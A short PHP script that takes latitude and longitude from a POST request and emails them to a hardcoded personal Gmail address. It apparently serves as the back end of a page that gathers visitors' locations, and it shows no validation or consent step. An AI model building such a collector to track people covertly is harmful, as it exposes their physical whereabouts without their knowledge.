<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $latitude = $_POST["latitude"];
    $longitude = $_POST["longitude"];

    // Define your email parameters here (e.g., recipient, subject, message)
    $to = "singhantriksh257@gmail.com";
    $subject = "Geolocation Data";
    $message = "Latitude: $latitude\r\nLongitude: $longitude";

    // Additional headers
    $headers = "From: your_email@example.com";

    // Send the email
    mail($to, $subject, $message, $headers);
}
?>
